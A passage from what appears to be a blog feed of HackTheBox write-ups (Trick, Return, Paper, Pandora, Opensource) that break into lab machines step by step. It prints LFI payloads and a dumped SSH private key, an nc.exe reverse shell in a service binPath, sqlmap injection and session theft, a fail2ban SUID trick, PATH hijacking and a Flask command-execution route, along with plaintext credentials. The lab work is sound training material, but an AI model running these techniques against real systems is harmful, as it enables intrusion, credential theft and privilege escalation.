can use the following command to perform an AXFR zone-transfer, gathering all domain names.┌──(bitis㉿workstation)-[~/htb/Machines/trick]└─$ dig trick.htb axfr @10.129.80.75 9 ⨯; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.1-1-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; trick.htb axfr @10.129.80.75;; global options: +cmdtrick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800trick.htb. 604800 IN NS trick.htb.trick.htb. 604800 IN A 127.0.0.1trick.htb. 604800 IN AAAA ::1preprod-payroll.trick.htb. 604800 IN CNAME trick.htb.trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800;; Query time: 23 msec;; SERVER: 10.129.80.75#53(10.129.80.75) (TCP);; WHEN: Mon Jun 27 21:32:33 CEST 2022;; XFR size: 6 records (messages 1, bytes 231)More information on this can be found here. We add the new domain to our hosts file and check it out.We are greeted with a login page. We do not know any credentials at this point, so this seems like a dead end at this point. We can use sed to prepend a string to each word in a list. Since we have a subdomain that starts with preprod-, we could append this to each line in our dns enumeration wordlist like so sed -e &#39;s/^/preprod-/&#39; /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt &amp;gt; dict.txt. We can then attempt to discover new subdomains via gobuster.┌──(bitis㉿workstation)-[~/htb/Machines/trick]└─$ gobuster vhost -u trick.htb -w dict.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://trick.htb[+] Method: GET[+] Threads: 10[+] Wordlist: dict.txt[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/06/27 21:57:43 Starting gobuster in VHOST enumeration mode===============================================================Found: preprod-marketing.trick.htb (Status: 200) [Size: 9660]Found: preprod-payroll.trick.htb (Status: 302) [Size: 9546] We find one new domain that we can add to our hosts file.An interesting aspect of this part is that it uses an argument in the URL, ?page to load what page to view. If we try to use a path like ../../../../etc/passwd we don’t get anything, however if we try something like ....//....//....//....//etc/passwd we get the passwd file:This works since the site is not filtering our inout properly. It replaces or removes the string ../, but not correctly. This means that the string ....// gets transformed into ../, giving us LFI.We now know that a user named michael exists. We can use the LFI vulnerability to access his ssh key:┌──(bitis㉿workstation)-[~/htb/Machines/trick]└─$ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtzc4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2GYQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK41kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaCDkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizEhkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1LjnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3CaUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjCtnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455GeU+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1VPH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXAfvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sTAuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgnIn16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DPJkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XNjsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==-----END OPENSSH PRIVATE KEY-----We can then use the key to login via SSH, giving us the user flag.Privilege escalationRunning sudo -l gives us the following:michael@trick:~$ sudo -lMatching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restartmichael@trick:~$ I found this blogpost detailing how to abuse fail2ban to gain root privileges. It detials how you can rewrite the file /etc/fail2ban/action.d/iptables-multiport.conf file to run a command when fail2ban bans an ip. We modify the config file to set the bash binary as SUID. We then setup hydra to attack the system, which will then execute the command we configured in the config file instead of banning our ip:A snippet from the config file can be found below:---SNIP---# Option: actionban# Notes.: command executed when banning an IP. Take care that the# command is executed with Fail2Ban user rights.# Tags: See jail.conf(5) man page# Values: CMD#actionban = chmod u+s /bin/bash---SNIP---michael@trick:~$ ls -al /bin/bash-rwsr-xr-x 1 root root 1168776 Apr 18 2019 /bin/bashmichael@trick:~$ /bin/bash -pbash-5.0# iduid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)bash-5.0# rooted!" }, { "title": "Return writeup", "url": "/posts/Return/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, windows, printer", "date": "2022-06-27 15:00:00 +0200", "snippet": "SummaryThis box is an easy windows machine that focuses on using a user that is part of the Server Operators group to start a service giving us a reverse shell as nt authority\\systemFootholdWe start out by doing an nmap port scanStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-27 23:28 CESTNmap scan report for 10.129.95.241Host is up (0.023s latency).Not shown: 988 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: HTB Printer Admin Panel| http-methods: |_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-06-27 21:46:55Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_clock-skew: 18m35s| smb2-time: | date: 2022-06-27T21:47:01|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 20.92 secondsThe server has a bunch of ports open. Let’s start by checking out the web application hosted on port 80, since it seems like an admin panel for a printer.If we access the settings tab we can change the address of the server to our own IP address. We can then setup a listener on port 389. This is just so we can see what is going on when the machine tries to connect to us.┌──(bitis㉿workstation)-[~/htb/Machines/return]└─$ nc -lvnp 389 1 ⨯listening on [any] 389 ...connect to [10.10.14.24] from (UNKNOWN) [10.129.95.241] 492430*`%return\\svc-printer� 1edFg43012!!It seems that when the printer attempted to connect to our machine it gave us its name and password. Neat. We can use these credentials to login via evil-winrm.┌──(bitis㉿workstation)-[~/htb/Machines/return]└─$ evil-winrm -i 10.129.95.241 -u &#39;svc-printer&#39; -p &#39;1edFg43012!!&#39; 1 ⨯Evil-WinRM shell v3.3Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machineData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completionInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; Privilege escalationNow that we have access to the system we should check out what kind of privileges our user has.Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; net user svc-printerUser name svc-printerFull Name SVCPrinterComment Service Account for PrinterUser&#39;s commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 5/26/2021 1:15:13 AMPassword expires NeverPassword changeable 5/27/2021 1:15:13 AMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 6/27/2022 3:00:17 PMLogon hours allowed AllLocal Group Memberships *Print Operators *Remote Management Use *Server OperatorsGlobal Group memberships *Domain UsersThe command completed successfully.Our user is part of the Server Operators group, which can stop and start services on the system. We can add our own little service, start it and then elevate our privileges.*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; upload /home/bitis/htb/Machines/return/nc.exeInfo: Uploading /home/bitis/htb/Machines/return/nc.exe to C:\\Users\\svc-printer\\Documents\\nc.exe Data: 51488 bytes of 51488 bytes copiedInfo: Upload successful!*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; sc.exe config vss binPath=&quot;C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd.exe 10.10.14.24 4444&quot;[SC] ChangeServiceConfig SUCCESS*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; sc.exe stop vss[SC] ControlService FAILED 1062:The service has not been started.*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; sc.exe start vss[SC] StartService FAILED 1053:The service did not respond to the start or control request in a timely fashion.*Evil-WinRM* PS C:\\Users\\svc-printer\\Documents&amp;gt; We successfully changed the vss service to create a reverse shell on port 4444 before restarting it┌──(bitis㉿workstation)-[~/htb/Machines/return]└─$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.10.14.24] from (UNKNOWN) [10.129.95.241] 49274Microsoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&amp;gt;net usersnet usersUser accounts for \\\\-------------------------------------------------------------------------------Administrator Guest krbtgt svc-printer The command completed with one or more errors.C:\\Windows\\system32&amp;gt;whoamiwhoamint authority\\systemC:\\Windows\\system32&amp;gt;Rooted!" }, { "title": "Paper writeup", "url": "/posts/Paper/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, wordpress", "date": "2022-06-27 15:00:00 +0200", "snippet": "SummaryThis was an interesting box which was centered around a new exploit which was recently disclosed at the time of the release. Enumeration of the server headers was needed to get to a worpress site, which contained a vulnerability that allows us to read unpublished drafts. These drafts contain a link to a chat application, where we can exploit a chatbot into getting access to a file containing crdentials.FootholdLet’s start out with an nmap port scan:# Nmap 7.92 scan initiated Sat Feb 12 16:34:12 2022 as: nmap -sC -sV -p- -o nmap/full.txt -Pn 10.129.139.201Nmap scan report for 10.129.139.201Host is up (0.093s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-title: HTTP Server Test Page powered by CentOS|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| http-methods: |_ Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-title: HTTP Server Test Page powered by CentOS| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after: 2022-07-08T10:32:34| tls-alpn: |_ http/1.1|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Feb 12 16:34:39 2022 -- 1 IP address (1 host up) scanned in 27.18 secondsThe system has 3 ports open, 22, 80 and 443. If we access the site hosted on the system we are greeted with a standard centOS welcome pageIf we take a look at the response we receive from the server when trying to access the site, we see a header named x-backend-server.It contains the domain of another application that we can also access after we add it to our hosts file. When accessing office.paper, we are greeted with a Wordpress site which is made to resemble the website of a famous paper company.If we take a look at one of the posts, one user is saying that the drafts feature is insecure.The Wappalyzer plug-in tells us that the version of Wordpress is 5.2.3. Searching for vulnerabilities in this version gives us this which allows us to view private and unpiblished drafts. If we go to http://office.paper/?static=1 we see all the private drafts on the site. The drafts include a registration link for a chat platform: http://chat.office.paper/register/8qozr226AhkCHZdyY. We add the domain to our hosts file and register our user. When we enter the chat room we see that somebody has added a chatbot which supports a lot of features including dm’s.When we chat with the bot we discover that we can access local files on the systemWe can use this to access the .env file of the chatbot, which contains the password of the dwight user. (We can figure this out based on the fact that the bot is running in his home directory)We can use the credentials dwight:Queenofblad3s!23 to login via ssh.Privilege escalationOnce we have access as dwight, we run linpeas to see if any interesting is on the system.---SNIP---╔══════════╣ Sudo version╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.29 ╔══════════╣ CVEs CheckVulnerable to CVE-2021-3560 ---SNIP---As we can see linpeas tells us the system is vulnerable to CVE-2021-3560, also known as pwnkit. Exploiting this is trivial, we simply duse one of multiple POC’s found on the internet. For example this one.[dwight@paper ~]$ ./pwnkit.sh[!] Username set as : secnigma[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as &quot;centos&quot;[!] Checking if Accountsservice and Gnome-Control-Center is installed[+] Accounts service and Gnome-Control-Center Installation Found!![!] Checking if polkit version is vulnerable[+] Polkit version appears to be vulnerable!![!] Starting exploit...[!] Inserting Username secnigma...Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required[+] Inserted Username secnigma with UID 1005![!] Inserting password hash...[!] It looks like the password insertion was succesful![!] Try to login as the injected user using su - secnigma[!] When prompted for password, enter your password [!] If the username is inserted, but the login fails; try running the exploit again.[!] If the login was succesful,simply enter &#39;sudo bash&#39; and drop into a root shell![dwight@paper ~]$ su - secnigmaPassword: [secnigma@paper ~]$ sudo bash[sudo] password for secnigma: [root@paper secnigma]# Rooted" }, { "title": "Pandora writeup", "url": "/posts/Pandora/", "categories": "Writeup, HackTheBox", "tags": "Easy-box", "date": "2022-06-26 15:00:00 +0200", "snippet": "SummaryThis was quite a long but relatively straight forward easy-box. The box is centered around enumerating an snmp service, then doing some port forwarding to access a pandora web application only available on localhost. We can then exploit a SUID binary via path highjacking to gain root access. Leẗ́’s begin.FootholdWe start out by doing an nmap port scan┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ nmap -sC -sV 10.129.82.187Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 19:13 CESTNmap scan report for 10.129.82.187Host is up (0.092s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)| 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)|_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Play | LandingService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 10.70 secondsBased on the output the system ha 2 ports open, 22 and 80. If we check out the web application hosted on port 80 we see the following:Landing page for pandoraEnumertaing the website does not really reveal anything interesting. Instead if we also perform a port scan of UDP ports on the machine, we find that the machine is also hosting a service via UDP.┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ sudo nmap -sU -sC -sV 10.129.82.187[sudo] password for bitis: Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 19:18 CESTNmap scan report for 10.129.82.187Host is up (0.024s latency).Not shown: 997 closed udp ports (port-unreach)PORT STATE SERVICE VERSION68/udp open|filtered dhcpc161/udp open snmp SNMPv1 server; net-snmp SNMPv3 server (public)...38615/udp open|filtered unknownService Info: Host: pandoraService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 1308.49 secondsIf we use snmpwalk to enumerate the service we find a string which contains credentials for the daniel user┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ snmpwalk -v 2c -c public 10.129.82.187iso.3.6.1.2.1.1.1.0 = STRING: &quot;Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64&quot;iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10iso.3.6.1.2.1.1.3.0 = Timeticks: (102912) 0:17:09.12iso.3.6.1.2.1.1.4.0 = STRING: &quot;Daniel&quot;iso.3.6.1.2.1.1.5.0 = STRING: &quot;pandora&quot;iso.3.6.1.2.1.1.6.0 = STRING: &quot;Mississippi&quot;iso.3.6.1.2.1.1.7.0 = INTEGER: 72...iso.3.6.1.2.1.25.4.2.1.5.975 = STRING: &quot;-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid&quot;iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: &quot;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&quot;iso.3.6.1.2.1.25.4.2.1.5.987 = &quot;&quot;iso.3.6.1.2.1.25.4.2.1.5.990 = &quot;&quot;iso.3.6.1.2.1.25.4.2.1.5.991 = STRING: &quot;-o -p -- \\\\u --noclear tty1 linux&quot;iso.3.6.1.2.1.25.4.2.1.5.1029 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.1043 = &quot;&quot;iso.3.6.1.2.1.25.4.2.1.5.1044 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.1045 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.1046 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.1047 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.1048 = STRING: &quot;-k start&quot;iso.3.6.1.2.1.25.4.2.1.5.1125 = STRING: &quot;-u daniel -p HotelBabylon23&quot;iso.3.6.1.2.1.25.4.2.1.5.1130 = STRING: &quot;-k start&quot;...We can then use the credentials daniel:HotelBabylon23 to login as the user daniel on the machine.PivotHowever when we login we do not see any user flag. Instead by looking at the home directory as well as taking a look at /etc/passwd we can tell another user exists named matt. If we check out the apache configuration, we notice that a site with the web directory of /etc/www/pandora exists and being served internally on port 80 of the localhost.daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf &amp;lt;VirtualHost localhost:80&amp;gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt &amp;lt;Directory /var/www/pandora&amp;gt; AllowOverride All &amp;lt;/Directory&amp;gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined&amp;lt;/VirtualHost&amp;gt;We can then use port forwarding via SSH to find out what this pandora application is all about.┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ ssh -L 5555:127.0.0.1:80 daniel@10.129.82.187 Pandora landing pageThe landing page tells us that this application uses Pandora v7.0NG.742_FIX_PERL2020 specifically. If we search for vulnerabilities in this version of pandora, we find this blogpost from sonarsource listing a few vulnerabilities. The most interesting is the unauthenticated SQL injection.We can run SQLmap to fetch user data from the application:┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ sqlmap -u &quot;http://localhost:5555/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot; --level=5 --risk=3 --dbms=mySQL --tables...Database: pandora[178 tables]+---------------------------------------+| taddress || taddress_agent || tagent_access || tagent_custom_data || tagent_custom_fields |---SNIP---| tsesion || tsesion_extended || tsessions_php || tskin || tsnmp_filter || tvisual_console_elements_cache || twidget || twidget_dashboard |+---------------------------------------+We can then dump the tsessions_php table to steal a session from an authenticated user.┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ sqlmap -u &quot;http://localhost:5555/pandora_console/include/chart_generator.php?session_id=&#39;&#39;&quot; --level=5 --risk=3 --dbms=mySQL --dump -T &quot;tsessions_php&quot;+----------------------------+-----------------------------------------------------+-------------+| id_session | data | last_active |+----------------------------+-----------------------------------------------------+-------------+| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;; | 1638783555 |---SNIP---| bbhf4mtod74tqhv50mpdvu4lj5 | id_usuario|s:6:&quot;daniel&quot;; | 1641201982 || fqd96rcv4ecuqs409n5qsleufi | NULL | 1638786762 || g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;; | 1638783230 || g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:{}new_chat|b:0; | 1638796349 || heasjj8c48ikjlvsf1uhonfesv | NULL | 1638540345 || hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;; | 163816849 |Based on the dump we can steal the session from the matt user by appending it to the url as the value of the session_id variable. Once this is done we see the dashboard of the matt user.Looking at the blogpost from earlier, we learn of a RCE vulnerability which exists for authenticated users in Pandora via the events feature. Another option is to use the POC found here. This POC gives us admin rights in the dasboard. We can then upload a file to the system which is a php reverse shell.We can then access the /images directory, find our shell and gain access to the system:┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ nc -lvnp 1337listening on [any] 1337 ...connect to [10.10.17.182] from (UNKNOWN) [10.129.82.187] 53232Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 18:44:49 up 1:33, 1 user, load average: 0.00, 0.02, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATdaniel pts/1 10.10.17.182 18:00 44:29 0.03s 0.03s -bashuid=1000(matt) gid=1000(matt) groups=1000(matt)/bin/sh: 0: can&#39;t access tty; job control turned off$ cd /home/matt$ lsuser.txtPrivilege escalationNow that we have user access to the system we need to gain access to the root user. We start out by finding SUID binaries:$ find / -perm -4000 2&amp;gt;/dev/null/usr/bin/sudo/usr/bin/pkexec/usr/bin/chfn/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/umount/usr/bin/pandora_backup/usr/bin/passwd/usr/bin/mount/usr/bin/su/usr/bin/at/usr/bin/fusermount/usr/bin/chsh/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1$ Two binaries stand out. The first is at, which we can use to break out of restricted environments. The second is /usr/bin/pandora_backup. After using at, we can take a further look at the backup binary.$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;matt@pandora:/$ echo &quot;/bin/sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&quot; | at now; tail -f /dev/null&amp;lt;(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&quot; | at now; tail -f /dev/nullwarning: commands will be executed using /bin/shjob 3 at Sun Jun 26 19:00:00 2022/bin/sh: 0: can&#39;t access tty; job control turned off$ ididuid=1000(matt) gid=1000(matt) groups=1000(matt)$Running strings on the binary reveals that it is using the relative and not the absolute path, which means we can perform path highjacking to gain root.┌──(bitis㉿workstation)-[~/htb/Machines/Pandora]└─$ strings pandora_backup /lib64/ld-linux-x86-64.so.2putssetreuidsystemgetuidgeteuid__cxa_finalize__libc_start_mainlibc.so.6GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu/UH[]A\\A]A^A_PandoraFMS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!To do this, we simply create our own file called tar, with whatever commands we want.$ echo &quot;/bin/bash -p&quot; &amp;gt; tarecho &quot;/bin/bash -p&quot; &amp;gt; tar$ chmod +x tarchmod +x tar$ export PATH=/tmp:$PATHexport PATH=/tmp:$PATH$ /usr/bin/pandora_backup/usr/bin/pandora_backupPandoraFMS Backup UtilityNow attempting to backup PandoraFMS clientbash: cannot set terminal process group (973): Inappropriate ioctl for devicebash: no job control in this shellroot@pandora:/tmp# Rooted! The reason this works is that by creating our own tar file, and adding the folder it resides in to the front of our path variable, is that when the system calls path without the absolute path, it finds the path via the path variable. It looks in each folder in the variable and calls the first file named tar it finds, which in this case was our malicious file." }, { "title": "Opensource writeup", "url": "/posts/Opensource/", "categories": "Writeup, HackTheBox", "tags": "Easy-box, chisel, flask", "date": "2022-06-25 16:00:00 +0200", "snippet": "SummaryFootholdWe start out by doing an nmap port scan:# Nmap 7.92 scan initiated Wed Jun 8 16:04:07 2022 as: nmap -sC -sV -o nmap/ini.txt opensource.htbNmap scan report for opensource.htb (10.129.160.73)Host is up (0.067s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)| 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)|_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)80/tcp open http Werkzeug/2.1.2 Python/3.10.3|_http-title: upcloud - Upload files for Free!|_http-server-header: Werkzeug/2.1.2 Python/3.10.3...3000/tcp filtered ppp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :...Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Jun 8 16:05:42 2022 -- 1 IP address (1 host up) scanned in 94.69 secondsThe system has 3 ports open, 22 80 and 3000. Port 80 is hosting a flask-based web application based on the http-server-header and port 3000 is hosting an unknown, filtered service. We start out by visitng the web application hosted on port 80:Landing page for opensourceThe website allows us to download a zip archive containing the source code for the web application.The source code contains the following code:@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] file_name = get_file_name(f.filename) file_path = os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, file_name) f.save(file_path) return render_template(&#39;success.html&#39;, file_url=request.host_url + &quot;uploads/&quot; + file_name) return render_template(&#39;upload.html&#39;)If we take a look at the documentation for the os.path.join() method, we gather that “If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.” This means that if we give the application a file named like so /app/app/views.py, it will overwrite the views.py of the app, which in this case is the file that handles the routes of the application. This means if we add a function like@app.route(&#39;/exec&#39;)def cmd(): return os.system(request.args.get(&#39;cmd&#39;))We can then run commands on the system hosting the application.We can use burpsuite to intercept the upload request, and then rename the file.We then get redirected to the upload page telling us we have successfully uploaded the file:If we attempt to access the exec endpoint with the argument “?cmd=ls” we get the following page:This indicate that we successfully overwrote the views.py file, since the application seems to attempt to carry out the command. If we then use a URL encoded python reverse shell we get access to the container hosting 